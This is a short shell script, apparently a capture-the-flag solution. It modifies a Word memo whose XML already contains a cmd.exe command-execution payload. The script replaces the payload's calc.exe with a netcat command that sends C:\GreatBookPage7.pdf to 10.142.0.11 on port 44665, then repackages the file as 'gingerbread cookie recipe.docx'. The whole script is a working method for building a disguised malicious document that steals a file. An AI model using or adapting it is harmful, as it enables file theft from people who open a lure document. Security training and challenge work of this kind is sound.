#!/bin/sh

INPUT="../support_files/FileStore/MEMO - Calculator Access for Wunorse.docx"
OUTPUT="gingerbread cookie recipe.docx"

INPUT=$(realpath "$INPUT")
OUTPUT=$(realpath "$OUTPUT")

ls -l "$INPUT"

rm -r temp_word_doc
mkdir temp_word_doc
cd temp_word_doc
unzip "$INPUT"

echo Before:
egrep -io '.{30}cmd.exe.{40}' word/document.xml

cat word/document.xml | sed "s/calc.exe/netcat.exe 10.142.0.11 44665 < C:\/GreatBookPage7.pdf/" > a
mv a word/document.xml

echo After:
egrep -io '.{30}cmd.exe.{80}' word/document.xml

zip "$OUTPUT" -r .

cd ..
rm -r temp_word_doc
